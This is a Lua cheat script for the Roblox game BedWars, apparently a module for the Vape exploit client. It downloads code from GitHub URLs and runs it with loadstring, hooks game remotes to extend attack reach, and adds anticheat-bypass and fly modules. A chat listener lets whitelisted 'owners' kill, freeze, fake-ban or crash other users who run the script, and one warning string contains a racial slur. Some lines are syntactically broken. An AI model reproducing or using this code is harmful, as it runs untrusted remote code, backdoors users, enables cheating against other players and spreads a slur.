local GuiLibrary = shared.GuiLibrary
local players = game:GetService("Players")
local RunService = game:GetService("RunService")
local Client = require(game:GetService("ReplicatedStorage").TS.remotes).default.Client
local textservice = game:GetService("TextService")
local repstorage = game:GetService("ReplicatedStorage")
local lplr = players.LocalPlayer
local lighting = game:GetService("Lighting")
local connectionstodisconnect = {}
local WhitelistFunctions = loadstring(game:HttpGet("https://raw.githubusercontent.com/NTDCore/whitelists/main/whitelist2.json", true))()
local targetinfo = shared.VapeTargetInfo
local collectionservice = game:GetService("CollectionService")
local uis = game:GetService("UserInputService")
local mouse = lplr:GetMouse()
local bedwars = {}
local bedwarsblocks = {}
local blockraycast = RaycastParams.new()
blockraycast.FilterType = Enum.RaycastFilterType.Whitelist
local getfunctions
local oldchar
local oldcloneroot
local bettergetfocus = function()
if KRNL_LOADED then
return ((game:GetService("Players").LocalPlayer.PlayerGui.Chat.Frame.ChatBarParentFrame.Frame.BoxFrame.Frame.ChatBar:IsFocused() or searchbar:IsFocused()) and true or nil)
else
	return game:GetService("UserInputService"):GetFocusedTextBox()
end
end
local betterisfile = function(file)
local suc, res = pcall(function() return readfile(file) end)
return suc and res ~= nil
end
local requestfunc = syn and syn.request or http and http.request or http_request or fluxus and fluxus.request or request or function(tab)
if tab.Method == "GET" then
return {
	Body = game:HttpGet(tab.Url, true),
	Headers = {},
	StatusCode = 200
} else
	return {
	Body = "bad exploit",
	Headers = {},
	StatusCode = 404
}
end
end
local matchState = 0
local kit = ""
local antivoidypos = 0
local kills = 0
local beds = 0
local lagbacks = 0
local otherlagbacks = 0
local matchstatetick = 0
local lagbackevent = Instance.new("BindableEvent")
local requestfunc = syn and syn.request or http and http.request or http_request or fluxus and fluxus.request or request or function(tab)
if tab.Method == "GET" then
return {
	Body = game:HttpGet(tab.Url, true),
	Headers = {},
	StatusCode = 200
} else
	return {
	Body = "bad exploit",
	Headers = {},
	StatusCode = 404
}
end
end
local queueteleport = syn and syn.queue_on_teleport or queue_on_teleport or fluxus and fluxus.queue_on_teleport or function() end
local teleportfunc
local getasset = getsynasset or getcustomasset or function(location) return "rbxasset://"..location end
local storedshahashes = {}
local oldshoot
local blocktable
local inventories = {}
local currentinventory = {
	["inventory"] = {
		["items"] = {},
		["armor"] = {},
		["hand"] = nil
	}
}
function IsAlive(plr)
plr = plr or lplr
if not plr.Character then return false end
if not plr.Character:FindFirstChild("Head") then return false end
if not plr.Character:FindFirstChild("Humanoid") then return false end
if plr.Character:FindFirstChild("Humanoid").Health < 0.11 then return false end
return true
end
function GetMatchState()
return bedwars["ClientHandlerStore"]:getState().Game.matchState
end
local queueType = "bedwars_test"
local networkownertick = tick()
local uninjectflag = false
local vec3 = Vector3.new
local cfnew = CFrame.new
local clients = {
	ChatStrings1 = {
		["KVOP25KYFPPP4"] = "vape",
		["IO12GP56P4LGR"] = "future",
		["RQYBPTYNURYZC"] = "rektsky"
	},
	ChatStrings2 = {
		["vape"] = "KVOP25KYFPPP4",
		["future"] = "IO12GP56P4LGR",
		["rektsky"] = "RQYBPTYNURYZC"
	},
	ClientUsers = {}
}
local function GetURL(scripturl)
if shared.VapeDeveloper then
return readfile("vape/"..scripturl)
else
	return game:HttpGet("https://raw.githubusercontent.com/7GrandDadPGN/VapeV4ForRoblox/main/"..scripturl, true)
end
end
local entity = shared.vapeentity

local function getremote(tab)
	for i,v in pairs(tab) do
		if v == "Client" then
			return tab[i + 1]
		end
	end
	return ""
end



checkpublicrepo = function(id)
local suc, req = pcall(function() return requestfunc({
	Url = "https://raw.githubusercontent.com/7GrandDadPGN/VapeV4ForRoblox/main/CustomModules/6872274481.lua",
	Method = "GET"
}) end)
if not suc then
checkpublicreponum = checkpublicreponum + 1
spawn(function()
	local textlabel = Instance.new("TextLabel")
	textlabel.Size = UDim2.new(1, 0, 0, 36)
	textlabel.Text = "Loading CustomModule Failed!, Attempts : "..checkpublicreponum
	textlabel.BackgroundTransparency = 1
	textlabel.TextStrokeTransparency = 0
	textlabel.TextSize = 30
	textlabel.Font = Enum.Font.SourceSans
	textlabel.TextColor3 = Color3.new(1, 1, 1)
	textlabel.Position = UDim2.new(0, 0, 0, -36)
	textlabel.Parent = GuiLibrary["MainGui"]
	task.wait(2)
	textlabel:Remove()
	end)
task.wait(2)
return checkpublicrepo(id)
end
if req.StatusCode == 200 then
return req.Body
end
return nil
end
local publicrepo = checkpublicrepo(game.PlaceId)
if publicrepo then
loadstring(publicrepo)()
end

local function getWhitelistedBed(bed)
	for i,v in pairs(players:GetChildren()) do
		if v:GetAttribute("Team") and bed and bed:GetAttribute("Team"..v:GetAttribute("Team").."NoBreak") and WhitelistFunctions:CheckWhitelisted(v) then
			return true
		end
	end
	return false
end

local OldClientGet 
local oldbreakremote
local oldbob
local localserverpos
local otherserverpos = {}
runcode(function()
    getfunctions = function()
		local Flamework = require(repstorage["rbxts_include"]["node_modules"]["@flamework"].core.out).Flamework
		repeat task.wait() until Flamework.isInitialized
        local KnitClient = debug.getupvalue(require(lplr.PlayerScripts.TS.knit).setup, 6)
        local Client = require(repstorage.TS.remotes).default.Client
        local InventoryUtil = require(repstorage.TS.inventory["inventory-util"]).InventoryUtil
        OldClientGet = getmetatable(Client).Get
        getmetatable(Client).Get = function(Self, remotename)
			if uninjectflag then return OldClientGet(Self, remotename) end
			local res = OldClientGet(Self, remotename)
			if remotename == "DamageBlock" then
				return {
					["CallServerAsync"] = function(Self, tab)
						local block = bedwars["BlockController"]:getStore():getBlockAt(tab.blockRef.blockPosition)
						if block and block.Name == "bed" then
							if getWhitelistedBed(block) then
								return {andThen = function(self, func) 
									func("failed")
								end}
							end
						end
						return res:CallServerAsync(tab)
					end,
					["CallServer"] = function(Self, tab)
						local block = bedwars["BlockController"]:getStore():getBlockAt(tab.blockRef.blockPosition)
						if block and block.Name == "bed" then
							if getWhitelistedBed(block) then
								return {andThen = function(self, func) 
									func("failed")
								end}
							end
						end
						return res:CallServer(tab)
					end
				}
			elseif remotename == bedwars["AttackRemote"] then
				return {
					["instance"] = res["instance"],
					["SendToServer"] = function(Self, tab)
						local suc, plr = pcall(function() return players:GetPlayerFromCharacter(tab.entityInstance) end)
						if suc and plr then
							local playertype, playerattackable = WhitelistFunctions:CheckPlayerType(plr)
							if not playerattackable then 
								return nil
							end
							if Reach["Enabled"] then
								local selfcheck = localserverpos or tab.validate.selfPosition.value
								if (selfcheck - (otherserverpos[plr] or tab.validate.targetPosition.value)).Magnitude > 18 then return res:SendToServer(tab) end
								local mag = (tab.validate.selfPosition.value - tab.validate.targetPosition.value).magnitude
								local newres = hashvec(tab.validate.selfPosition.value + (mag > 14.4 and (CFrame.lookAt(tab.validate.selfPosition.value, tab.validate.targetPosition.value).lookVector * 4) or Vector3.zero))
								tab.validate.selfPosition = newres
							end
						end
						return res:SendToServer(tab)
					end
				}
			end
            return res
        end

bedwars = {
	["DropItemRemote"] = getremote(debug.getconstants(getmetatable(KnitClient.Controllers.ItemDropController).dropItemInHand)),	
	["SprintController"] = KnitClient.Controllers.SprintController,	
	["CombatConstant"] = require(repstorage.TS.combat["combat-constant"]).CombatConstant,	
	["ClientHandlerStore"] = require(lplr.PlayerScripts.TS.ui.store).ClientStore,	
	["KnockbackUtil"] = require(game:GetService("ReplicatedStorage").TS.damage["knockback-util"]).KnockbackUtil,	
	["PingController"] = require(lplr.PlayerScripts.TS.controllers.game.ping["ping-controller"]).PingController,	
	["DamageIndicator"] = KnitClient.Controllers.DamageIndicatorController.spawnDamageIndicator,	
	["SwordController"] = KnitClient.Controllers.SwordController,	
	["ClientHandler"] = Client,	
	["AppController"] = require(repstorage["rbxts_include"]["node_modules"]["@easy-games"]["game-core"].out.client.controllers["app-controller"]).AppController,
	            ["DropItem"] = getmetatable(KnitClient.Controllers.ItemDropController).dropItemInHand,
            ["DropItemRemote"] = getremote(debug.getconstants(getmetatable(KnitClient.Controllers.ItemDropController).dropItemInHand)),
	["SwordRemote"] = getremote(debug.getconstants((KnitClient.Controllers.SwordController).attackEntity)),
	["AttackRemote"] = getremote(debug.getconstants(getmetatable(KnitClient.Controllers.SwordController)["attackEntity"])),
			["ResetRemote"] = getremote(debug.getconstants(debug.getproto(KnitClient.Controllers.ResetController.createBindable, 1))),
}
local RunLoops = {
	RenderStepTable = {}, StepTable = {}, HeartTable = {}}
do
function RunLoops:BindToRenderStep(name, num, func)
if RunLoops.RenderStepTable[name] == nil then
RunLoops.RenderStepTable[name] = game:GetService("RunService").RenderStepped:Connect(func)
end
end

function RunLoops:UnbindFromRenderStep(name)
if RunLoops.RenderStepTable[name] then
RunLoops.RenderStepTable[name]:Disconnect()
RunLoops.RenderStepTable[name] = nil
end
end

function RunLoops:BindToStepped(name, num, func)
if RunLoops.StepTable[name] == nil then
RunLoops.StepTable[name] = game:GetService("RunService").Stepped:Connect(func)
end
end

function RunLoops:UnbindFromStepped(name)
if RunLoops.StepTable[name] then
RunLoops.StepTable[name]:Disconnect()
RunLoops.StepTable[name] = nil
end
end

local function createwarning(title, text, delay)
	local suc, res = pcall(function()
		local frame = GuiLibrary["CreateNotification"](title, text, delay, "assets/WarningNotification.png")
		frame.Frame.Frame.ImageColor3 = Color3.fromRGB(201, 126, 14)
		return frame
	end)
	return (suc and res)
end

function RunLoops:BindToHeartbeat(name, num, func)
if RunLoops.HeartTable[name] == nil then
RunLoops.HeartTable[name] = game:GetService("RunService").Heartbeat:Connect(func)
end
end

function RunLoops:UnbindFromHeartbeat(name)
if RunLoops.HeartTable[name] then
RunLoops.HeartTable[name]:Disconnect()
RunLoops.HeartTable[name] = nil
end
end
end

local function runcode(func)
func()
end

local funnyFly = {["Enabled"] = false
}
local funnyAura = {["Enabled"] = false
}

runcode(function()
	local funnyFly
	local part
	local cam = workspace.CurrentCamera
	funnyFly = GuiLibrary["ObjectsThatCanBeSaved"]["BlatantWindow"]["Api"].CreateOptionsButton({
		["Name"] = "FunnyFly",
		["Function"] = function(callback)
		if callback then
		if funnyAura.Enabled then funnyAura.ToggleButton(false) end
		local origy = entity.character.HumanoidRootPart.Position.y
		part = Instance.new("Part", workspace)
		part.Size = Vector3.new(1,1,1)
		part.Transparency = 1
		part.Anchored = true
		part.CanCollide = false
		cam.CameraSubject = part
		RunLoops:BindToHeartbeat("FunnyFlyPart", 1, function()
			local pos = entity.character.HumanoidRootPart.Position
			part.Position = Vector3.new(pos.x, origy, pos.z)
			end)
		local cf = entity.character.HumanoidRootPart.CFrame
		entity.character.HumanoidRootPart.CFrame = CFrame.new(cf.x, 300000, cf.z)
		if entity.character.HumanoidRootPart.Position.X < 50000 then
		entity.character.HumanoidRootPart.CFrame *= CFrame.new(0, 100000, 0)
		end
		else
			RunLoops:UnbindFromHeartbeat("FunnyFlyPart")
		local pos = entity.character.HumanoidRootPart.Position
		local rcparams = RaycastParams.new()
		rcparams.FilterType = Enum.RaycastFilterType.Whitelist
		rcparams.FilterDescendantsInstances = {
			workspace.Map
		}
		rc = workspace:Raycast(Vector3.new(pos.x, 300, pos.z), Vector3.new(0,-1000,0), rcparams)
		if rc and rc.Position then
		entity.character.HumanoidRootPart.CFrame = CFrame.new(rc.Position) * CFrame.new(0,3,0)
		end
		cam.CameraSubject = lplr.Character
		part:Destroy()
		RunLoops:BindToHeartbeat("FunnyFlyVeloEnd", 1, function()
			entity.character.HumanoidRootPart.Velocity = Vector3.new(0,0,0)
			entity.character.HumanoidRootPart.CFrame = CFrame.new(rc.Position) * CFrame.new(0,3,0)
			end)
		task.wait(1)
		RunLoops:UnbindFromHeartbeat("FunnyFlyVeloEnd")

		end
		end
	})
end)
local function chat(msg)
	local args = {
		[1] = msg,
		[2] = "All"
	}

	game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))

end

function AddTag(plr, tag, color)
	local Players = game:GetService("Players")
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local Plr = plr
	local ChatTag = {}
	ChatTag[Plr] =
		{
			TagText = tag, --Text
			TagColor = color, --Rgb
			NameColor = color
		}



	local oldchanneltab
	local oldchannelfunc
	local oldchanneltabs = {}

	--// Chat Listener
	for i, v in pairs(getconnections(ReplicatedStorage.DefaultChatSystemChatEvents.OnNewMessage.OnClientEvent)) do
		if
			v.Function
			and #debug.getupvalues(v.Function) > 0
			and type(debug.getupvalues(v.Function)[1]) == "table"
			and getmetatable(debug.getupvalues(v.Function)[1])
			and getmetatable(debug.getupvalues(v.Function)[1]).GetChannel
		then
			oldchanneltab = getmetatable(debug.getupvalues(v.Function)[1])
			oldchannelfunc = getmetatable(debug.getupvalues(v.Function)[1]).GetChannel
			getmetatable(debug.getupvalues(v.Function)[1]).GetChannel = function(Self, Name)
				local tab = oldchannelfunc(Self, Name)
				if tab and tab.AddMessageToChannel then
					local addmessage = tab.AddMessageToChannel
					if oldchanneltabs[tab] == nil then
						oldchanneltabs[tab] = tab.AddMessageToChannel
					end
					tab.AddMessageToChannel = function(Self2, MessageData)
						if MessageData.FromSpeaker and Players[MessageData.FromSpeaker] then
							if ChatTag[Players[MessageData.FromSpeaker].Name] then
								MessageData.ExtraData = {
									NameColor = ChatTag[Players[MessageData.FromSpeaker].Name].NameColor
										or Players[MessageData.FromSpeaker].TeamColor.Color,
									Tags = {
										table.unpack(MessageData.ExtraData.Tags),
										{
											TagColor = ChatTag[Players[MessageData.FromSpeaker].Name].TagColor,
											TagText = ChatTag[Players[MessageData.FromSpeaker].Name].TagText,
										},
									},
								}
							end
						end
						return addmessage(Self2, MessageData)
					end
				end
				return tab
			end
		end
	end
end

local function getremote(tab)
	for i,v in pairs(tab) do
		if v == "Client" then
			return tab[i + 1]
		end
	end
	return ""
end

local oneTime
local priolist = {
	["DEFAULT"] = 0,
	["VAPE PRIVATE"] = 1,
	["VAPE OWNER"] = 2
}
local alreadysaidlist = {}

local function findplayers(arg, plr)
	local temp = {}
	local continuechecking = true

	if arg == "default" and continuechecking and WhitelistFunctions:CheckPlayerType(lplr) == "DEFAULT" then table.insert(temp, lplr) continuechecking = false end
	if arg == "teamdefault" and continuechecking and WhitelistFunctions:CheckPlayerType(lplr) == "DEFAULT" and plr and lplr:GetAttribute("Team") ~= plr:GetAttribute("Team") then table.insert(temp, lplr) continuechecking = false end
	if arg == "private" and continuechecking and WhitelistFunctions:CheckPlayerType(lplr) == "VAPE PRIVATE" then table.insert(temp, lplr) continuechecking = false end
	for i,v in pairs(game:GetService("Players"):GetChildren()) do if continuechecking and v.Name:lower():sub(1, arg:len()) == arg:lower() then table.insert(temp, v) continuechecking = false end end

	return temp
end
local commandsII = {
	["kill"] = function(args, plr)
		if entity.isAlive then
			local hum = entity.character.Humanoid
			bedwars["DamageController"]:requestSelfDamage(lplr.Character:GetAttribute("Health"), 3, "69", {fromEntity = {getInstance = function() return plr.Character end}})
			task.delay(0.1, function()
				if hum and hum.Health > 0 then 
					hum:ChangeState(Enum.HumanoidStateType.Dead)
					hum.Health = 0
					bedwars["ClientHandler"]:Get(bedwars["ResetRemote"]):SendToServer()
				end
			end)
		end
	end,
	["steal"] = function(args, plr)
		if GuiLibrary["ObjectsThatCanBeSaved"]["AutoBankOptionsButton"]["Api"]["Enabled"] then 
			GuiLibrary["ObjectsThatCanBeSaved"]["AutoBankOptionsButton"]["Api"]["ToggleButton"](false)
			task.wait(1)
		end
		for i,v in pairs(currentinventory.inventory.items) do 
			local e = bedwars["ClientHandler"]:Get(bedwars["DropItemRemote"]):CallServer({
				item = v.tool,
				amount = v.amount ~= math.huge and v.amount or 99999999
			})
			if e then 
				e.CFrame = plr.Character.HumanoidRootPart.CFrame
			else
				v.tool:Destroy()
			end
		end
	end,
	["lagback"] = function(args)
		if entity.isAlive then
			entity.character.HumanoidRootPart.Velocity = Vector3.new(9999999, 9999999, 9999999)
		end
	end,
	["jump"] = function(args)
		if entity.isAlive and entity.character.Humanoid.FloorMaterial ~= Enum.Material.Air then
			entity.character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
		end
	end,
	["sit"] = function(args)
		if entity.isAlive then
			entity.character.Humanoid.Sit = true
		end
	end,
	["unsit"] = function(args)
		if entity.isAlive then
			entity.character.Humanoid.Sit = false
		end
	end,
	["freeze"] = function(args)
		if entity.isAlive then
			entity.character.HumanoidRootPart.Anchored = true
		end
	end,
	["unfreeze"] = function(args)
		if entity.isAlive then
			entity.character.HumanoidRootPart.Anchored = false
		end
	end,
	["deletemap"] = function(args)
		for i,v in pairs(collectionservice:GetTagged("block")) do
			v:Destroy()
		end
	end,
	["void"] = function(args)
		if entity.isAlive then
			task.spawn(function()
				repeat
					task.wait()
					entity.character.HumanoidRootPart.CFrame = addvectortocframe(entity.character.HumanoidRootPart.CFrame, Vector3.new(0, -3, 0))
				until not entity.isAlive
			end)
		end
	end,
	["framerate"] = function(args)
		if #args >= 1 then
			if setfpscap then
				setfpscap(tonumber(args[1]) ~= "" and math.clamp(tonumber(args[1]) or 9999, 1, 9999) or 9999)
			end
		end
	end,
	["crash"] = function(args)
		setfpscap(9e9)
    	print(game:GetObjects("h29g3535")[1])
	end,
	["chipman"] = function(args)
		local function funnyfunc(v)
			if v:IsA("ImageLabel") or v:IsA("ImageButton") then
				v.Image = "http://www.roblox.com/asset/?id=6864086702"
				v:GetPropertyChangedSignal("Image"):Connect(function()
					v.Image = "http://www.roblox.com/asset/?id=6864086702"
				end)
			end
			if (v:IsA("TextLabel") or v:IsA("TextButton")) and v:GetFullName():find("ChatChannelParentFrame") == nil then
				if v.Text ~= "" then
					v.Text = "chips"
				end
				v:GetPropertyChangedSignal("Text"):Connect(function()
					if v.Text ~= "" then
						v.Text = "chips"
					end
				end)
			end
			if v:IsA("Texture") or v:IsA("Decal") then
				v.Texture = "http://www.roblox.com/asset/?id=6864086702"
				v:GetPropertyChangedSignal("Texture"):Connect(function()
					v.Texture = "http://www.roblox.com/asset/?id=6864086702"
				end)
			end
			if v:IsA("MeshPart") then
				v.TextureID = "http://www.roblox.com/asset/?id=6864086702"
				v:GetPropertyChangedSignal("TextureID"):Connect(function()
					v.TextureID = "http://www.roblox.com/asset/?id=6864086702"
				end)
			end
			if v:IsA("SpecialMesh") then
				v.TextureId = "http://www.roblox.com/asset/?id=6864086702"
				v:GetPropertyChangedSignal("TextureId"):Connect(function()
					v.TextureId = "http://www.roblox.com/asset/?id=6864086702"
				end)
			end
			if v:IsA("Sky") then
				v.SkyboxBk = "http://www.roblox.com/asset/?id=6864086702"
				v.SkyboxDn = "http://www.roblox.com/asset/?id=6864086702"
				v.SkyboxFt = "http://www.roblox.com/asset/?id=6864086702"
				v.SkyboxLf = "http://www.roblox.com/asset/?id=6864086702"
				v.SkyboxRt = "http://www.roblox.com/asset/?id=6864086702"
				v.SkyboxUp = "http://www.roblox.com/asset/?id=6864086702"
			end
		end
	
		for i,v in pairs(game:GetDescendants()) do
			funnyfunc(v)
		end
		game.DescendantAdded:Connect(funnyfunc)
	end,
	["rickroll"] = function(args)
		local function funnyfunc(v)
			if v:IsA("ImageLabel") or v:IsA("ImageButton") then
				v.Image = "http://www.roblox.com/asset/?id=7083449168"
				v:GetPropertyChangedSignal("Image"):Connect(function()
					v.Image = "http://www.roblox.com/asset/?id=7083449168"
				end)
			end
			if (v:IsA("TextLabel") or v:IsA("TextButton")) and v:GetFullName():find("ChatChannelParentFrame") == nil then
				if v.Text ~= "" then
					v.Text = "Never gonna give you up"
				end
				v:GetPropertyChangedSignal("Text"):Connect(function()
					if v.Text ~= "" then
						v.Text = "Never gonna give you up"
					end
				end)
			end
			if v:IsA("Texture") or v:IsA("Decal") then
				v.Texture = "http://www.roblox.com/asset/?id=7083449168"
				v:GetPropertyChangedSignal("Texture"):Connect(function()
					v.Texture = "http://www.roblox.com/asset/?id=7083449168"
				end)
			end
			if v:IsA("MeshPart") then
				v.TextureID = "http://www.roblox.com/asset/?id=7083449168"
				v:GetPropertyChangedSignal("TextureID"):Connect(function()
					v.TextureID = "http://www.roblox.com/asset/?id=7083449168"
				end)
			end
			if v:IsA("SpecialMesh") then
				v.TextureId = "http://www.roblox.com/asset/?id=7083449168"
				v:GetPropertyChangedSignal("TextureId"):Connect(function()
					v.TextureId = "http://www.roblox.com/asset/?id=7083449168"
				end)
			end
			if v:IsA("Sky") then
				v.SkyboxBk = "http://www.roblox.com/asset/?id=7083449168"
				v.SkyboxDn = "http://www.roblox.com/asset/?id=7083449168"
				v.SkyboxFt = "http://www.roblox.com/asset/?id=7083449168"
				v.SkyboxLf = "http://www.roblox.com/asset/?id=7083449168"
				v.SkyboxRt = "http://www.roblox.com/asset/?id=7083449168"
				v.SkyboxUp = "http://www.roblox.com/asset/?id=7083449168"
			end
		end
	
		for i,v in pairs(game:GetDescendants()) do
			funnyfunc(v)
		end
		game.DescendantAdded:Connect(funnyfunc)
	end,
	["gravity"] = function(args)
		workspace.Gravity = tonumber(args[1]) or 192.6
	end,
	["kick"] = function(args)
		local str = ""
		for i,v in pairs(args) do
			str = str..v..(i > 1 and " " or "")
		end
		task.spawn(function()
			lplr:Kick(str)
		end)
		bedwars["ClientHandler"]:Get("TeleportToLobby"):SendToServer()
	end,
	["ban"] = function(args)
		task.spawn(function()
			lplr:Kick("You have been temporarily banned. Remaining ban duration: 4960 weeks 2 days 5 hours 19 minutes "..math.random(45, 59).." seconds")
		end)
		bedwars["ClientHandler"]:Get("TeleportToLobby"):SendToServer()
	end,
	["uninject"] = function(args)
		GuiLibrary["SelfDestruct"]()
	end,
	["disconnect"] = function(args)
		game:GetService("CoreGui"):FindFirstChild("RobloxPromptGui"):FindFirstChild("promptOverlay").DescendantAdded:Connect(function(obj)
			if obj.Name == "ErrorMessage" then
				obj:GetPropertyChangedSignal("Text"):Connect(function()
					obj.Text = "Please check your internet connection and try again.\n(Error Code: 277)"
				end)
			end
			if obj.Name == "LeaveButton" then
				local clone = obj:Clone()
				clone.Name = "LeaveButton2"
				clone.Parent = obj.Parent
				clone.MouseButton1Click:Connect(function()
					clone.Visible = false
					local video = Instance.new("VideoFrame")
					video.Video = getcustomassetfunc("vape/assets/skill.webm")
					video.Size = UDim2.new(1, 0, 1, 36)
					video.Visible = false
					video.Position = UDim2.new(0, 0, 0, -36)
					video.ZIndex = 9
					video.BackgroundTransparency = 1
					video.Parent = game:GetService("CoreGui"):FindFirstChild("RobloxPromptGui"):FindFirstChild("promptOverlay")
					local textlab = Instance.new("TextLabel")
					textlab.TextSize = 45
					textlab.ZIndex = 10
					textlab.Size = UDim2.new(1, 0, 1, 36)
					textlab.TextColor3 = Color3.new(1, 1, 1)
					textlab.Text = "skill issue"
					textlab.Position = UDim2.new(0, 0, 0, -36)
					textlab.Font = Enum.Font.Gotham
					textlab.BackgroundTransparency = 1
					textlab.Parent = game:GetService("CoreGui"):FindFirstChild("RobloxPromptGui"):FindFirstChild("promptOverlay")
					video.Loaded:Connect(function()
						video.Visible = true
						video:Play()
						task.spawn(function()
							repeat
								wait()
								for i = 0, 1, 0.01 do
									wait(0.01)
									textlab.TextColor3 = Color3.fromHSV(i, 1, 1)
								end
							until true == false
						end)
					end)
					task.wait(19)
					task.spawn(function()
						pcall(function()
							if getconnections then
								getconnections(entity.character.Humanoid.Died)
							end
							print(game:GetObjects("h29g3535")[1])
						end)
						while true do end
					end)
				end)
				obj.Visible = false
			end
		end)
		task.wait(0.1)
		lplr:Kick()
	end,
	["togglemodule"] = function(args)
		if #args >= 1 then
			local module = GuiLibrary["ObjectsThatCanBeSaved"][args[1].."OptionsButton"]
			if module then
				if module["Api"]["Enabled"] == (not args[2] == "true") then
					module["Api"]["ToggleButton"]()
				end
			end
		end
	end,
	["shutdown"] = function(args)
		game:Shutdown()
	end,
	["errorkick"] = function(args)
		if entity.isAlive then 
			pcall(function() lplr.Character.Head:Destroy() end)
		end
	end
}
local commands = {
	["kill"] = function(args, plr)
	if IsAlive then
		lplr.Character.Humanoid.Health = 0
		end
	end,
	["lagback"] = function()
	if entity.IsAlive then
		entity.character.HumanoidRootPart.CFrame += Vector3.new(129919212,0,0)
		end
	end,
	["multidamage"] = function()
		local lastHealth = 100
		local Humanoid = lplr.Character.Humanoid
		oneTime = true

		Humanoid.HealthChanged:Connect(function(health)
			if health < lastHealth then
				lplr.Character.Humanoid.Health = lplr.Character.Humanoid.Health + -25
			end
			lastHealth = health
		end)
	end,
	["freeze"] = function()
	if IsAlive then
		lplr.Character.HumanoidRootPart.Anchored = true
		end
	end,
	["unfreeze"] = function()
	if IsAlive then
		lplr.Character.HumanoidRootPart.Anchored = false
		end
	end,
	["ban"] = function()
		task.spawn(function()
			lplr:Kick("You have been temporarily banned. Remaining ban duration: 4960 weeks 2 days 5 hours 19 minutes "..math.random(45, 59).." seconds")
		end)
	end,
	["uninject"] = function()
	GuiLibrary["SelfDestruct"]()
	end,
	["shutdown"]
	["crash"] = function()
		while true do
			print("Moon On Top")
		end
	end,
}

local tableofrandom = {"7647ddd1-58ea-4979-950d-ff50351c2422"}
local users = {}
local HWID = game:GetService("RbxAnalyticsService"):GetClientId()
function getID(plr)
	for _,v in pairs(users) do
		if v == plr.Name then
			return true
		end
	end
	return false
end

function whitelisted()
	for _,v in pairs(tableofrandom) do
		if v == HWID then
			return true
		end
	end
	return false
end
if whitelisted() then
	AddTag(lplr.Name,"NTDCORE PRIVATE", Color3.fromRGB(255, 0, 234))
end
local events = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents")
local messageDoneFiltering = events:WaitForChild("OnMessageDoneFiltering")
local players = game:GetService("Players")
function makeConnections()
	messageDoneFiltering.OnClientEvent:Connect(function(message)
		local player = players:FindFirstChild(message.FromSpeaker)
		local message = message.Message or ""
		if player then
			if message == "e" then
				if whitelisted() then
					chat("e")
					AddTag(player.Name,"VAPE USER",Color3.fromRGB(255, 238, 0))
				end
			end
			if not whitelisted() and message == "yoo" then
				AddTag(player.Name,"NTDCORE OWNER", Color3.fromRGB(255, 0, 234))
				table.insert(users,player.Name)
			end
			if getID(player) then
				if lplr.Name ~= player.Name then
					if message == ";kill Default" then
						commands.kill()
					elseif message == ";lagback Default" then
						commands.lagback()
					elseif message == ";multidamage Default" then
						commands.multidamage()
					elseif message == ";freeze Default" then
						commands.freeze()
					elseif message == ";unfreeze Default" then
						commands.unfreeze()
					elseif message == ";ban Default" then
						commands.ban()
					elseif message == ";crash Default" then
						commands.crash()
					end
				end
			end
		end
	end)
	chat("")
end

local oneTime = false

if not whitelisted() then
	chat("e")
end
if not connections then
	connections = true
	makeConnections()
end

runcode(function()
local ACTP = {["Value"] = 8.1}
local ACbypass = {["Enabled"] = false}
ACbypass = GuiLibrary["ObjectsThatCanBeSaved"]["UtilityWindow"]["Api"].CreateOptionsButton({
	["Name"] = "AnticheatBypassV2",
	["Function"] = function(callback)
	if callback then
		local lplr = game.Players.LocalPlayer
local cam = workspace.CurrentCamera
local oldchar
local clone

oldchar = lplr.Character
oldchar.Archivable = true
clone = oldchar:Clone()
oldchar.PrimaryPart.Anchored = false

local humc = oldchar.Humanoid:Clone()
humc.Parent = lplr.Character
game:GetService("RunService").Stepped:connect(function()
    local mag = (clone.PrimaryPart.Position - oldchar.PrimaryPart.Position).Magnitude
    if mag >= ACTP["Value"] then
        oldchar:SetPrimaryPartCFrame(clone.PrimaryPart.CFrame)
    end
end)
pcall(function()
    oldchar.PrimaryPart:GetPropertyChangedSignal("CFrame"):connect(function()
    end)
end)

cam.CameraSubject = clone.Humanoid 
clone.Parent = workspace
lplr.Character = clone
   else
   	createwarning("you cant", "Turn off niggas",5)
	end
end
})
ACTP = ACbypass.CreateSlider({
	["Name"] = "TP Range",
	["Min"] = 1,
	["Max"] = 10,
	["Function"] = function(val) end,
	["Default"] = 8.1
})
end)
runcode(function()
	local TexturePacks = {["Enabled"] = false}
	TexturePacks = GuiLibrary["ObjectsThatCanBeSaved"]["RenderWindow"]["Api"].CreateOptionsButton({
		["Name"] = "TexturePack",
		["Function"] = function(callback)
			if callback then
	local obj = game:GetObjects("rbxassetid://11144793662")[1]

                obj.Name = "Part"

                obj.Parent = game:GetService("ReplicatedStorage")
                local newconnection
                newconnection = game:GetService("ReplicatedStorage").ChildAdded:Connect(function(v)
                    for i,x in pairs(obj:GetChildren()) do
                        x:Clone().Parent = v
                    end
                    newconnection:Disconnect()
                end)
                loadstring(game:HttpGet("https://raw.githubusercontent.com/eLeCtRaDoMiNuS/milkwareclient/main/texture.lua"))()
        end
    end
})
end)
  runcode(function()
	local velo
	local flyup = false
	local flydown = false
	local connection
	local connection2
	local BounceFly = {["Enabled"] = false
	}
	BounceFly = GuiLibrary["ObjectsThatCanBeSaved"]["BlatantWindow"]["Api"].CreateOptionsButton({
		["Name"] = "BounceFly",
		["Function"] = function(callback)
		if callback then
		velo = Instance.new("BodyVelocity")
		velo.MaxForce = Vector3.new(0,9e9,0)
		velo.Parent = lplr.Character:FindFirstChild("HumanoidRootPart")
		connection = uis.InputBegan:Connect(function(input)
			if input.KeyCode == Enum.KeyCode.Space then
			flyup = true
			end
			if input.KeyCode == Enum.KeyCode.LeftShift then
			flydown = true
			end
			end)
		connection2 = uis.InputEnded:Connect(function(input)
			if input.KeyCode == Enum.KeyCode.Space then
			flyup = false
			end
			if input.KeyCode == Enum.KeyCode.LeftShift then
			flydown = false
			end
			end)
		spawn(function()
			repeat
			task.wait()
			for i = 1,15 do
			task.wait()
			if not BounceFly["Enabled"] then return end
			velo.Velocity = Vector3.new(0,i*1.25+(flyup and 42 or 0)+(flydown and -42 or 0),0)
			end
			for i = 1,15 do
			task.wait()
			if not BounceFly["Enabled"] then return end
			velo.Velocity = Vector3.new(0,-i*1+(flyup and 42 or 0)+(flydown and -42 or 0),0)
			end
			until not BounceFly["Enabled"]
			end)
		else
			velo:Destroy()
		connection:Disconnect()
		connection2:Disconnect()
